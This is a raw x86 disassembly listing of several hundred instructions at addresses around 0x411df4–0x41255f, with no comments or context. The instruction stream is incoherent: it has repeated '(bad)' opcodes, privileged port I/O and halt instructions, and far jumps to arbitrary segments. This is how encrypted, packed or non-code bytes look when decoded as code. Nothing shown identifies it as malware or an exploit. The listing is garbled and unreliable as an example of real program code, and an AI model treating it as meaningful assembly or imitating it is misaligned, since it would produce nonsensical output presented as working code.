  411df4:	and    ah,BYTE PTR ds:0x8b9d25c7
  411dfa:	in     eax,dx
  411dfb:	mov    eax,0x6df2c684
  411e00:	push   eax
  411e01:	mov    ch,0x5
  411e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e04:	aas    
  411e05:	and    al,0x7e
  411e07:	in     al,dx
  411e08:	cmp    al,0xe8
  411e0a:	sub    ecx,DWORD PTR [ebx+ebx*4]
  411e0d:	(bad)  
  411e0f:	push   ecx
  411e10:	fst    st(7)
  411e12:	retf   
  411e13:	push   ss
  411e14:	dec    ecx
  411e15:	push   es
  411e16:	lahf   
  411e17:	mov    WORD PTR ds:[eax-0x24],fs
  411e1b:	jl     0x411e12
  411e1d:	push   eax
  411e1e:	xchg   ch,ah
  411e20:	mov    BYTE PTR [edx+0x78d8ad14],ch
  411e26:	and    eax,0xf5f497d0
  411e2b:	sbb    eax,DWORD PTR [ebx]
  411e2d:	aaa    
  411e2e:	mov    ebp,0x91443160
  411e33:	(bad)  
  411e34:	adc    edx,esp
  411e36:	popa   
  411e37:	pop    esp
  411e38:	sar    DWORD PTR [edi+0x41],cl
  411e3b:	(bad)  
  411e3c:	sbb    edx,DWORD PTR [esi-0x4e5d813f]
  411e42:	add    eax,0xcfe2b5ad
  411e47:	mov    eax,0xc70699f5
  411e4c:	inc    esp
  411e4d:	(bad)  
  411e4e:	xor    eax,0x2bba909e
  411e53:	out    0x71,al
  411e55:	imul   ebx,DWORD PTR [ebp-0x6f73f820],0x21
  411e5c:	adc    al,0x35
  411e5e:	xchg   esi,eax
  411e5f:	fcmovu st,st(3)
  411e61:	jbe    0x411e5c
  411e63:	cmp    ah,BYTE PTR ds:0xffdf77d2
  411e69:	fstp   QWORD PTR [ecx]
  411e6b:	push   edi
  411e6c:	push   0x5ee70703
  411e71:	adc    edx,DWORD PTR [ebp+0x1c]
  411e74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e75:	mov    eax,0x4f226ca9
  411e7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e7b:	mov    edi,0xd8261e6a
  411e80:	push   eax
  411e81:	push   es
  411e82:	mov    ch,0x16
  411e84:	das    
  411e85:	fbld   TBYTE PTR [esi+edx*8-0x6d]
  411e89:	pop    ebp
  411e8a:	xor    eax,DWORD PTR [ecx+ecx*2+0x16516bcd]
  411e91:	aas    
  411e92:	sti    
  411e93:	mov    dh,0xd
  411e95:	popf   
  411e96:	fidiv  DWORD PTR [ecx+0x3f5bfe53]
  411e9c:	nop
  411e9d:	pop    ebx
  411e9e:	loop   0x411eeb
  411ea0:	or     BYTE PTR [edx+0x53],bl
  411ea3:	mov    al,ds:0xf0a43530
  411ea8:	hlt    
  411ea9:	push   es
  411eaa:	xor    eax,0xf2268f8c
  411eaf:	sub    esi,ebp
  411eb1:	popf   
  411eb2:	sahf   
  411eb3:	ffree  st(7)
  411eb5:	add    eax,0x3fab0c06
  411eba:	cmp    BYTE PTR [ebx],ch
  411ebc:	or     dh,BYTE PTR [edi+0x6f229971]
  411ec2:	add    ah,ah
  411ec4:	xchg   esp,eax
  411ec5:	imul   ebx,DWORD PTR [ebp-0x28],0xffffffd6
  411ec9:	xchg   edi,eax
  411eca:	xchg   edi,ebp
  411ecc:	jne    0x411f2b
  411ece:	shl    DWORD PTR [ecx+esi*8-0x73],1
  411ed2:	pusha  
  411ed3:	fmul   DWORD PTR [ebp-0x38de4d3]
  411ed9:	std    
  411eda:	pop    eax
  411edb:	sbb    edi,DWORD PTR [edx+0x1d04da8d]
  411ee1:	pop    esi
  411ee2:	jb     0x411e6e
  411ee4:	adc    eax,0x665812f7
  411ee9:	lock ror DWORD PTR [esi],0xbc
  411eed:	push   esi
  411eee:	lods   al,BYTE PTR ds:[esi]
  411eef:	shl    BYTE PTR [edx],cl
  411ef1:	sbb    al,0x55
  411ef3:	and    al,0x8c
  411ef5:	mov    edi,0x5da8c16b
  411efa:	mov    ds:0x4a3e688b,al
  411eff:	jno    0x411ea6
  411f01:	popf   
  411f02:	pushf  
  411f03:	push   ss
  411f04:	dec    edi
  411f05:	lods   eax,DWORD PTR ds:[esi]
  411f06:	jno    0x411efb
  411f08:	jns    0x411e98
  411f0a:	iret   
  411f0b:	push   esp
  411f0c:	pop    esp
  411f0d:	scas   eax,DWORD PTR es:[edi]
  411f0e:	jns    0x411ea1
  411f10:	dec    ebp
  411f11:	xchg   ebx,eax
  411f12:	inc    edi
  411f13:	xchg   DWORD PTR cs:[esi],esi
  411f16:	(bad)  
  411f18:	xchg   edx,eax
  411f19:	in     eax,0xe7
  411f1b:	out    dx,eax
  411f1c:	pop    ss
  411f1d:	mov    edx,DWORD PTR [esi+0x52]
  411f20:	jecxz  0x411eee
  411f22:	mov    edx,0x91943b27
  411f27:	and    BYTE PTR [ebx+0x19],0x4d
  411f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f2c:	iret   
  411f2d:	cli    
  411f2e:	lods   eax,DWORD PTR ds:[esi]
  411f2f:	aad    0x6b
  411f31:	shl    BYTE PTR [edi+0x5edb1eac],1
  411f37:	cmp    al,0xa3
  411f39:	mov    dh,0x59
  411f3b:	nop
  411f3c:	mov    esi,0xab94d39b
  411f41:	sub    ebp,DWORD PTR [eax+edi*1-0x693e0a0b]
  411f48:	add    al,bh
  411f4a:	mov    al,al
  411f4c:	push   cs
  411f4d:	aam    0xe4
  411f4f:	div    esi
  411f51:	js     0x411f56
  411f53:	push   esp
  411f54:	icebp  
  411f55:	xchg   DWORD PTR [edi],edi
  411f57:	bound  ebx,QWORD PTR [ebx-0x373c34fd]
  411f5d:	jbe    0x411fa4
  411f5f:	nop
  411f60:	int    0x14
  411f62:	aad    0x31
  411f64:	sahf   
  411f65:	rcl    ecx,0x2
  411f68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f69:	jae    0x411f82
  411f6b:	push   edi
  411f6c:	xchg   esp,eax
  411f6d:	or     edi,esp
  411f6f:	push   es
  411f70:	inc    edi
  411f71:	out    dx,eax
  411f72:	push   es
  411f73:	retf   0x5ce4
  411f76:	(bad)  
  411f78:	add    DWORD PTR [ebx],ecx
  411f7a:	icebp  
  411f7b:	jge    0x411f66
  411f7d:	xchg   edi,edx
  411f7f:	mov    ecx,0x59e19d29
  411f84:	xchg   ecx,eax
  411f85:	push   ebp
  411f86:	sub    ebx,esp
  411f88:	pop    edx
  411f89:	dec    edx
  411f8a:	or     DWORD PTR [edx+0x688b3117],ebx
  411f90:	jmp    0xb805a0cf
  411f95:	jle    0x411f24
  411f97:	and    esp,0xffffff9f
  411f9a:	xchg   esp,eax
  411f9b:	cmp    esi,DWORD PTR [esi-0x40abf218]
  411fa1:	jbe    0x411f88
  411fa3:	jbe    0x411f64
  411fa5:	popa   
  411fa6:	inc    ebx
  411fa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fa8:	aam    0x78
  411faa:	out    0xc4,al
  411fac:	out    dx,al
  411fad:	sbb    al,0x66
  411faf:	push   ss
  411fb0:	sbb    ah,dh
  411fb2:	mov    eax,ds:0x7815a150
  411fb7:	or     ch,BYTE PTR [ecx+0x7a]
  411fba:	daa    
  411fbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fbc:	push   es
  411fbd:	(bad)  
  411fbe:	mov    ebp,0xd140976a
  411fc3:	jb     0x41200a
  411fc5:	cmp    ch,bl
  411fc7:	push   ebx
  411fc8:	fcomp  QWORD PTR [ebx+0x1ad4627f]
  411fce:	aaa    
  411fcf:	pop    ebp
  411fd0:	jmp    0x1a9666ec
  411fd5:	sbb    ebp,DWORD PTR [ebx-0x3c]
  411fd8:	push   cs
  411fd9:	retf   
  411fda:	in     eax,0xf7
  411fdc:	cmp    eax,DWORD PTR gs:[ecx-0x65]
  411fe0:	ret    
  411fe1:	xchg   ebp,eax
  411fe2:	mov    al,0xa8
  411fe4:	lar    edi,si
  411fe7:	loop   0x412053
  411fe9:	shr    ah,1
  411feb:	out    0x86,al
  411fed:	cmp    esp,DWORD PTR [edx+0x4c]
  411ff0:	adc    DWORD PTR [edx+0x5de90a61],0x6b9ebe4
  411ffa:	enter  0xd574,0xd1
  411ffe:	hlt    
  411fff:	xchg   edx,eax
  412000:	in     eax,dx
  412001:	xor    eax,ebx
  412003:	(bad)  
  412004:	mov    cl,dh
  412006:	sbb    al,0x8f
  412008:	test   eax,0xa5ed4f5c
  41200d:	fst    QWORD PTR [eax+0x38]
  412010:	jbe    0x412037
  412012:	adc    DWORD PTR [edi-0x32e658c2],ebx
  412018:	repnz outs dx,DWORD PTR ds:[esi]
  41201a:	retf   0xdec4
  41201d:	daa    
  41201e:	sub    al,0xdd
  412020:	xlat   BYTE PTR ds:[ebx]
  412021:	add    DWORD PTR ds:0x9bf59a3c,ebp
  412027:	sahf   
  412028:	fstp   DWORD PTR [edx]
  41202a:	es mov edx,0x285c602f
  412030:	inc    edx
  412031:	adc    eax,0x2294891b
  412036:	jcxz   0x4120b0
  412039:	mov    al,0x9f
  41203b:	jmp    0xf729:0x3ccaa43
  412042:	rcr    DWORD PTR [ebx],1
  412044:	dec    edi
  412045:	int3   
  412046:	pop    eax
  412047:	(bad)  
  412048:	imul   edx,DWORD PTR [eax],0xe
  41204b:	mov    ebp,0xe5e180ac
  412050:	cld    
  412051:	js     0x4120b9
  412053:	jno    0x4120ae
  412055:	fs loop 0x412035
  412058:	in     eax,0x2a
  41205a:	inc    edx
  41205b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41205c:	nop
  41205d:	outs   dx,BYTE PTR ds:[esi]
  41205e:	mov    edx,0x709c9961
  412063:	xchg   esp,eax
  412064:	test   DWORD PTR [edi+0x102d8279],esp
  41206a:	sbb    al,0xcd
  41206c:	aas    
  41206d:	iret   
  41206e:	xchg   ebx,eax
  41206f:	jge    0x412089
  412071:	xchg   ecx,eax
  412072:	or     ch,cl
  412074:	pusha  
  412075:	jb     0x41201e
  412077:	stc    
  412078:	aaa    
  412079:	(bad)  
  41207a:	fld    DWORD PTR [edx+0x6e40fc1a]
  412080:	int    0x7e
  412082:	dec    ebp
  412083:	xchg   esp,eax
  412084:	daa    
  412085:	and    dl,cl
  412087:	fnstenv [edi+0x67e420ba]
  41208d:	xchg   ebp,eax
  41208e:	xlat   BYTE PTR ds:[ebx]
  41208f:	leavew 
  412091:	cdq    
  412092:	into   
  412093:	cmp    DWORD PTR [eax+0x7dd750e1],eax
  412099:	jg     0x412062
  41209b:	and    esp,DWORD PTR [edx+0x3400ebc8]
  4120a1:	ret    
  4120a2:	retf   0x5527
  4120a5:	sub    ebx,ebp
  4120a7:	sbb    dl,BYTE PTR [edi-0x754a90a3]
  4120ad:	dec    esp
  4120ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120af:	adc    esp,DWORD PTR [edi+0x3f]
  4120b2:	inc    edi
  4120b3:	in     al,dx
  4120b4:	dec    ch
  4120b6:	xchg   ebp,eax
  4120b7:	sbb    ebp,edx
  4120b9:	mov    ds:0x328ffbea,al
  4120be:	ror    BYTE PTR [ecx+0x21],cl
  4120c1:	jecxz  0x412123
  4120c3:	sbb    esi,DWORD PTR [ecx+0x29]
  4120c6:	gs aaa 
  4120c8:	(bad)  
  4120c9:	mov    ?,edx
  4120cb:	fidivr DWORD PTR [ebx+0x3]
  4120ce:	jg     0x41209d
  4120d0:	inc    eax
  4120d1:	jg     0x412102
  4120d3:	xchg   edi,eax
  4120d4:	xchg   BYTE PTR [esi+0x4e],bh
  4120d7:	fsubrp st(2),st
  4120d9:	inc    esi
  4120da:	bnd jns 0x41214b
  4120dd:	imul   esi,DWORD PTR [esi],0x422389d3
  4120e3:	(bad)  
  4120e4:	dec    esi
  4120e5:	mov    ds:0xb8729834,eax
  4120ea:	aaa    
  4120eb:	stc    
  4120ec:	add    ebp,eax
  4120ee:	pop    ebx
  4120ef:	sub    DWORD PTR [ebx-0x56],eax
  4120f2:	dec    eax
  4120f3:	jno    0x4120d2
  4120f5:	and    ebx,DWORD PTR [eax]
  4120f7:	jae    0x41209c
  4120f9:	scas   al,BYTE PTR es:[edi]
  4120fa:	fstp   TBYTE PTR [esi]
  4120fc:	jb     0x4120f6
  4120fe:	sbb    cl,BYTE PTR [ebp-0x7c]
  412101:	sbb    eax,0xa12e9f5f
  412106:	rcl    BYTE PTR [eax],cl
  412108:	cdq    
  412109:	mov    ebp,0xc09f9927
  41210e:	fcmovbe st,st(7)
  412110:	sbb    eax,0x1af85d01
  412115:	sti    
  412116:	gs push ebx
  412118:	mov    eax,0x3cb7f42
  41211d:	xor    ecx,edx
  41211f:	fxch   st(5)
  412121:	mov    eax,ds:0xb747c33e
  412126:	arpl   WORD PTR [edx-0x2d],sp
  412129:	mov    dl,0x9a
  41212b:	repnz int 0x29
  41212e:	jecxz  0x4120e3
  412130:	jb     0x412123
  412132:	(bad)  
  412133:	adc    esi,DWORD PTR [edx+0x69129d31]
  412139:	sbb    bh,cl
  41213b:	daa    
  41213c:	add    ebx,DWORD PTR [ebx-0x33]
  41213f:	jno    0x412179
  412141:	xlat   BYTE PTR ds:[ebx]
  412142:	dec    esi
  412143:	les    edi,FWORD PTR [edi]
  412145:	(bad)  
  412146:	lock jbe 0x412163
  412149:	or     ecx,DWORD PTR [ecx+0xe]
  41214c:	fcomp  DWORD PTR [esi-0x75]
  41214f:	ror    DWORD PTR [edx],0x5c
  412152:	ds stos BYTE PTR es:[edi],al
  412154:	mov    ecx,DWORD PTR gs:0xdc6beefa
  41215b:	jbe    0x4121c1
  41215d:	and    BYTE PTR [edx+ebx*4-0x15],0x5
  412162:	mov    cl,0x48
  412164:	or     DWORD PTR [ebx],ecx
  412166:	in     eax,dx
  412167:	bound  ecx,QWORD PTR [edi+0x25b946b8]
  41216d:	jecxz  0x412139
  41216f:	and    DWORD PTR ds:0xe797f7b7,edx
  412175:	test   al,0xf5
  412177:	and    BYTE PTR [esp+edi*4+0x4a],bh
  41217b:	xchg   ebx,eax
  41217c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41217d:	les    esp,FWORD PTR [ebx+0x4]
  412180:	dec    ecx
  412181:	outs   dx,DWORD PTR ds:[esi]
  412182:	push   ecx
  412183:	mov    al,0x32
  412185:	and    BYTE PTR [edi],bh
  412187:	stos   BYTE PTR es:[edi],al
  412188:	inc    edi
  412189:	js     0x41216f
  41218b:	or     eax,DWORD PTR [ebx+0x15189344]
  412191:	xor    eax,0x2acb4889
  412196:	clc    
  412197:	rcl    DWORD PTR [ebx],1
  412199:	pop    ss
  41219a:	retf   
  41219b:	fst    DWORD PTR [edx+0x1f6f7229]
  4121a1:	sahf   
  4121a2:	sbb    edx,DWORD PTR [edi+0x1e]
  4121a5:	(bad)  
  4121a6:	push   DWORD PTR ds:0xc32f9cf5
  4121ac:	xchg   esp,eax
  4121ad:	jmp    0x4121eb
  4121af:	xor    DWORD PTR [edx],ebx
  4121b1:	bound  bx,DWORD PTR [eax+0x660f96e1]
  4121b8:	pop    edx
  4121b9:	xor    DWORD PTR [edi+0x3c],ecx
  4121bc:	gs push 0xffffffa6
  4121bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121c0:	adc    al,0x9e
  4121c2:	push   0xffffffef
  4121c4:	dec    ebx
  4121c5:	inc    eax
  4121c6:	ds push edi
  4121c8:	xchg   edi,eax
  4121c9:	and    DWORD PTR [ebx-0x9],edx
  4121cc:	jmp    0x5eca:0x556f1200
  4121d3:	xor    BYTE PTR [ebp-0x11],0xbc
  4121d7:	mov    edi,DWORD PTR [edx]
  4121d9:	dec    ebp
  4121da:	xor    al,0x75
  4121dc:	push   edi
  4121dd:	in     eax,0x9e
  4121df:	or     BYTE PTR [ebp+0x71],dl
  4121e2:	xchg   ah,ch
  4121e4:	jo     0x41221d
  4121e6:	clc    
  4121e7:	sbb    BYTE PTR [ebp+0x68],ah
  4121ea:	int    0x1f
  4121ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121ed:	call   0x99f9:0x3289fb46
  4121f4:	(bad)  [edi]
  4121f6:	ret    0xa501
  4121f9:	adc    BYTE PTR [edi+0x3413d578],ch
  4121ff:	add    al,0xa7
  412201:	cmp    BYTE PTR [edx-0x4c],0x41
  412205:	xchg   ebp,eax
  412206:	jl     0x41223f
  412208:	pop    ss
  412209:	xlat   BYTE PTR ds:[ebx]
  41220a:	pop    ebp
  41220b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41220c:	mov    DWORD PTR [eax+0xc396557],eax
  412212:	loope  0x4121a4
  412214:	ins    BYTE PTR es:[edi],dx
  412215:	pop    eax
  412216:	and    al,0x8d
  412218:	fldenv [ecx-0x3d]
  41221b:	push   esp
  41221c:	jnp    0x412239
  41221e:	stos   DWORD PTR es:[edi],eax
  41221f:	ins    BYTE PTR es:[edi],dx
  412220:	jmp    0x5086dab6
  412225:	retf   0xdd57
  412228:	sub    BYTE PTR [esi-0x1939734d],al
  41222e:	in     eax,dx
  41222f:	pop    ebx
  412230:	jne    0x4122ab
  412232:	adc    eax,DWORD PTR [edx+0x5f]
  412235:	in     al,dx
  412236:	jecxz  0x4121b8
  412238:	mov    ebp,?
  41223a:	mov    dh,0x4
  41223c:	mov    ecx,0x3f51b774
  412241:	xchg   esp,eax
  412242:	test   BYTE PTR [edi-0x22],dh
  412245:	jbe    0x41229d
  412247:	inc    ebp
  412248:	outs   dx,DWORD PTR ds:[esi]
  412249:	popa   
  41224a:	arpl   WORD PTR [esp+ebx*8-0x4305fd77],bp
  412251:	test   eax,0x1090ab70
  412256:	mov    ebp,0xb34b7521
  41225b:	xor    edi,DWORD PTR ds:0x41220653
  412261:	jmp    0x412207
  412263:	sahf   
  412264:	jne    0x412271
  412266:	xor    BYTE PTR [ebp-0x5d],cl
  412269:	inc    esi
  41226a:	lahf   
  41226b:	aas    
  41226c:	mov    WORD PTR [esi-0x49],ds
  41226f:	imul   esp,DWORD PTR [edx],0x19
  412272:	and    DWORD PTR [ebx+0x69c23978],0x42
  412279:	or     eax,0xbb47b1
  41227e:	aam    0x74
  412280:	and    eax,0x23e70a1f
  412285:	test   BYTE PTR [esp+ecx*2+0x7a],bh
  412289:	sub    BYTE PTR [ecx-0x5d],0xe7
  41228d:	dec    BYTE PTR [edi]
  41228f:	adc    esi,DWORD PTR [esp+eax*8+0x35]
  412293:	sub    DWORD PTR cs:[ecx],ebp
  412296:	shl    DWORD PTR [eax],cl
  412298:	ror    BYTE PTR [ebx+0x28],0x94
  41229c:	cs ins BYTE PTR es:[edi],dx
  41229e:	rcr    DWORD PTR [edx-0x2c38aac],1
  4122a4:	imul   edi,DWORD PTR ds:0xde2a5028,0x44f718d4
  4122ae:	fist   WORD PTR [edi+ebx*8-0x1a174957]
  4122b5:	or     BYTE PTR [esi+0x1f],cl
  4122b8:	aaa    
  4122b9:	adc    DWORD PTR [edx-0x61418447],eax
  4122bf:	dec    BYTE PTR [edx+0x234cdf80]
  4122c5:	pusha  
  4122c6:	(bad)  
  4122c7:	in     al,dx
  4122c8:	adc    eax,0x97118701
  4122cd:	xor    DWORD PTR [edi-0x3],ecx
  4122d0:	fild   WORD PTR [esp+edi*8+0x0]
  4122d4:	mov    bl,BYTE PTR [ecx]
  4122d6:	mov    al,ds:0xf53a5a27
  4122db:	xchg   ebp,eax
  4122dc:	push   ecx
  4122dd:	lds    edx,FWORD PTR [esi+0x24]
  4122e0:	xchg   esp,eax
  4122e1:	pop    ebp
  4122e2:	push   eax
  4122e3:	cwde   
  4122e4:	cmp    al,0x77
  4122e6:	ret    
  4122e7:	jecxz  0x412312
  4122e9:	(bad)  
  4122ea:	les    eax,FWORD PTR [ebp-0x3c]
  4122ed:	jne    0x4122fc
  4122ef:	mov    ecx,DWORD PTR [edi]
  4122f1:	sub    DWORD PTR [edi],esp
  4122f3:	xor    al,0x3f
  4122f6:	dec    edx
  4122f7:	call   0xe85b9ab5
  4122fc:	push   edx
  4122fd:	add    ebx,DWORD PTR [edi+0x272a6b35]
  412303:	stc    
  412304:	jp     0x4122a4
  412306:	inc    ecx
  412307:	cmp    edx,ebp
  412309:	mov    cl,cl
  41230b:	sbb    DWORD PTR [esi-0x461d021],ebp
  412311:	mov    edx,0x8afe1dd0
  412316:	inc    ebp
  412317:	fcomip st,st(6)
  412319:	inc    esi
  41231a:	(bad)  
  41231b:	jp     0x41237f
  41231d:	outs   dx,BYTE PTR ds:[esi]
  41231e:	cwde   
  41231f:	inc    esp
  412320:	jg     0x412399
  412322:	out    dx,al
  412323:	inc    edi
  412324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412325:	out    0xd3,eax
  412327:	mov    esi,0x3e0dde71
  41232c:	jne    0x4122b6
  41232e:	imul   edi,DWORD PTR [ecx-0x1f18b412],0xffffffd6
  412335:	outs   dx,DWORD PTR ds:[esi]
  412336:	aas    
  412337:	and    DWORD PTR [ecx*8-0x386d3d5d],edx
  41233e:	or     esp,ebx
  412340:	mov    al,0xa8
  412342:	pop    ebx
  412343:	mov    edi,0xf93a21ca
  412348:	jmp    0x35f1:0x76973f52
  41234f:	jb     0x41232b
  412351:	outs   dx,DWORD PTR ds:[esi]
  412352:	adc    BYTE PTR [esp+eiz*8],al
  412355:	dec    edx
  412356:	add    BYTE PTR ds:0x4d39dc7d,al
  41235c:	in     al,dx
  41235d:	je     0x41235d
  41235f:	lods   al,BYTE PTR ds:[esi]
  412360:	mov    ch,0x43
  412362:	rol    ch,cl
  412364:	fld    TBYTE PTR [ebp-0x42f922f5]
  41236a:	sbb    al,0x19
  41236c:	popa   
  41236d:	mov    bl,0x6e
  41236f:	xor    edi,DWORD PTR [eax]
  412371:	jmp    FWORD PTR [eax]
  412373:	jp     0x412345
  412375:	xchg   esi,eax
  412376:	push   eax
  412377:	sub    DWORD PTR ds:0x9ece3fa8,edx
  41237d:	mov    bl,BYTE PTR [edx-0x5f46664f]
  412383:	xchg   ebx,eax
  412384:	lds    ebx,FWORD PTR [ebp+ebx*8+0x50]
  412388:	(bad)  
  412389:	stos   BYTE PTR es:[edi],al
  41238a:	xchg   ecx,eax
  41238b:	dec    eax
  41238c:	push   eax
  41238d:	mov    eax,ds:0xdb1e79f6
  412392:	jne    0x412328
  412394:	jnp    0x412365
  412396:	es xor al,0x13
  412399:	gs ffree st(5)
  41239c:	and    ah,dl
  41239e:	cli    
  41239f:	cmp    eax,0xd97a79fc
  4123a4:	sar    BYTE PTR [edx],1
  4123a6:	out    dx,eax
  4123a7:	mov    ebp,0x19251f51
  4123ac:	jns    0x41242b
  4123ae:	add    edx,DWORD PTR [ecx]
  4123b0:	(bad)  
  4123b1:	jl     0x41235a
  4123b3:	popa   
  4123b4:	mov    ecx,0xd861d8f6
  4123b9:	out    0xbd,eax
  4123bb:	mov    cl,0x3d
  4123bd:	pop    ebx
  4123be:	xchg   ebx,eax
  4123bf:	inc    edx
  4123c0:	and    DWORD PTR [ecx-0x52],ecx
  4123c3:	js     0x4123be
  4123c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123c6:	xchg   edi,eax
  4123c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123c8:	out    dx,eax
  4123c9:	fwait
  4123ca:	inc    edx
  4123cb:	sar    ebp,1
  4123cd:	xor    eax,0x2ad250d9
  4123d2:	frstor [edi+esi*8]
  4123d5:	sbb    DWORD PTR [ecx],eax
  4123d7:	inc    ebp
  4123d8:	stos   DWORD PTR es:[edi],eax
  4123d9:	fisubr DWORD PTR [esi]
  4123db:	jno    0x412449
  4123dd:	clc    
  4123de:	push   es
  4123df:	jge    0x4123b5
  4123e1:	retf   
  4123e2:	mov    cl,0xdd
  4123e4:	gs xchg ebp,eax
  4123e6:	daa    
  4123e7:	mov    ds:0x6fdcd2db,al
  4123ec:	imul   edi,ebx,0x91214cc1
  4123f2:	in     al,dx
  4123f3:	pcmpeqw mm7,QWORD PTR ds:0xe30ab472
  4123fa:	mov    dl,0x3e
  4123fc:	(bad)  
  4123fd:	sub    BYTE PTR [ecx-0x34],dh
  412400:	popf   
  412401:	out    dx,eax
  412402:	(bad)  
  412403:	dec    ecx
  412404:	xor    esi,DWORD PTR [eax-0x27]
  412407:	or     edx,DWORD PTR [ebx+0x34f76714]
  41240d:	xchg   ebp,eax
  41240e:	ins    BYTE PTR es:[edi],dx
  41240f:	mov    al,0x3
  412411:	adc    ah,BYTE PTR [ecx-0x49]
  412414:	repz imul eax,DWORD PTR [edx-0x3a],0x9cb1d1d2
  41241c:	mov    ch,0x7d
  41241e:	imul   ebp,eax,0x57053ce7
  412424:	dec    ecx
  412425:	xchg   edx,eax
  412426:	jmp    0x412409
  412428:	mov    eax,ss:0xb220cb7e
  41242e:	add    dl,BYTE PTR [ecx-0x46]
  412431:	mov    ch,0xbd
  412433:	jns    0x41243a
  412435:	cmp    eax,0x4d6cbab3
  41243a:	and    edx,DWORD PTR [esi+eiz*8-0x4795ec8]
  412441:	inc    ebx
  412442:	or     BYTE PTR [ebx-0x121f0ff4],bl
  412448:	jmp    DWORD PTR ds:0x243e13b5
  41244e:	enter  0x306d,0xea
  412452:	into   
  412453:	sar    dh,cl
  412455:	and    ebx,DWORD PTR [eax-0x34]
  412458:	js     0x4124a8
  41245a:	scas   eax,DWORD PTR es:[edi]
  41245b:	sub    ebp,DWORD PTR ds:0xafe40265
  412461:	cmp    edi,eax
  412463:	jne    0x4123ec
  412465:	mov    WORD PTR [esi-0x658e9229],?
  41246b:	dec    ebx
  41246c:	or     ecx,DWORD PTR [edx]
  41246e:	cmp    al,0xd7
  412470:	push   ebp
  412471:	lods   eax,DWORD PTR ds:[esi]
  412472:	scas   al,BYTE PTR es:[edi]
  412473:	xor    al,0x6d
  412475:	imul   ebp,eax,0xffffffd8
  412478:	cmp    BYTE PTR [edx],dl
  41247a:	jo     0x4124d0
  41247c:	sub    al,0x6d
  41247e:	rcr    BYTE PTR [eax+0x53c6f727],0x2a
  412485:	xchg   esp,eax
  412486:	dec    BYTE PTR [ebx]
  412488:	adc    DWORD PTR [edx+0x4e5ffd54],ebx
  41248e:	mov    edi,ebp
  412490:	push   ds
  412491:	cmc    
  412492:	push   es
  412493:	addr16 mov ch,0xf4
  412496:	sub    eax,0xaef661ca
  41249b:	add    al,0x58
  41249d:	mov    edi,0xb4de96f6
  4124a2:	pop    esp
  4124a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124a4:	dec    edx
  4124a5:	out    dx,al
  4124a6:	mov    ah,0xbf
  4124a8:	jae    0x4124b0
  4124aa:	out    0x6d,eax
  4124ac:	std    
  4124ad:	(bad)  
  4124ae:	scas   eax,DWORD PTR es:[edi]
  4124af:	scas   al,BYTE PTR es:[edi]
  4124b0:	cmp    DWORD PTR ds:0xff2e7432,eax
  4124b6:	stos   DWORD PTR es:[edi],eax
  4124b7:	in     eax,0x40
  4124b9:	jl     0x412454
  4124bb:	and    bl,BYTE PTR [ebp-0x4c46a259]
  4124c1:	mov    ds:0x1d190940,al
  4124c6:	jo     0x41253e
  4124c8:	icebp  
  4124c9:	pop    ss
  4124ca:	pop    es
  4124cb:	or     dh,BYTE PTR ds:0x5e88181f
  4124d1:	cmp    dl,ch
  4124d3:	(bad)  
  4124d4:	cdq    
  4124d5:	jbe    0x412468
  4124d7:	jns    0x412518
  4124d9:	pushf  
  4124da:	je     0x41253f
  4124dc:	rcr    BYTE PTR [edx-0x42],1
  4124df:	loopne 0x412529
  4124e1:	aam    0x63
  4124e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124e4:	mov    ebp,0x6a557400
  4124e9:	jb     0x4124dd
  4124eb:	and    bh,ah
  4124ed:	repnz mov edi,DWORD PTR [edi+0x27]
  4124f1:	ins    BYTE PTR es:[edi],dx
  4124f2:	fcomp  DWORD PTR [ebx+0x34cfe414]
  4124f8:	ins    BYTE PTR es:[edi],dx
  4124f9:	mov    ch,0x58
  4124fb:	fild   DWORD PTR [edx]
  4124fd:	pop    ds
  4124fe:	xchg   BYTE PTR [ebp+0x6d],cl
  412501:	jmp    0x65fe3910
  412506:	pop    edi
  412507:	push   cs
  412508:	xchg   edi,eax
  412509:	fnsave ds:0xb3d8f2b5
  41250f:	in     al,dx
  412510:	inc    edi
  412511:	add    eax,0xd4ceb46a
  412516:	test   BYTE PTR [ecx],bh
  412518:	push   ss
  412519:	mov    ebx,eax
  41251b:	fstp   DWORD PTR [eax]
  41251d:	std    
  41251e:	stc    
  41251f:	jmp    0x4124e3
  412521:	iret   
  412522:	outs   dx,DWORD PTR ds:[esi]
  412523:	jb     0x4124cd
  412525:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412526:	loop   0x412514
  412528:	out    dx,eax
  412529:	inc    ecx
  41252a:	push   ebp
  41252b:	fwait
  41252c:	cmp    bh,BYTE PTR [eax]
  41252e:	push   ebx
  41252f:	xor    eax,0xf275c530
  412534:	pop    eax
  412535:	jb     0x412510
  412537:	lods   eax,DWORD PTR ds:[esi]
  412538:	adc    BYTE PTR [edx],0xac
  41253b:	pop    esi
  41253c:	enter  0xb98d,0xc6
  412540:	ret    
  412541:	ins    BYTE PTR es:[edi],dx
  412542:	push   edx
  412543:	xchg   ecx,eax
  412544:	(bad)  
  412545:	mov    ecx,0x3a37c970
  41254a:	test   al,0x15
  41254c:	add    al,0x49
  41254e:	rol    DWORD PTR [ecx],cl
  412550:	loopne 0x4124dd
  412552:	popf   
  412553:	inc    ebp
  412554:	pop    edx
  412555:	mov    ah,0xfe
  412557:	iret   
  412558:	sbb    esi,DWORD PTR [eax+eax*8-0x7825eab4]
  41255f:	jg     0x4125ce
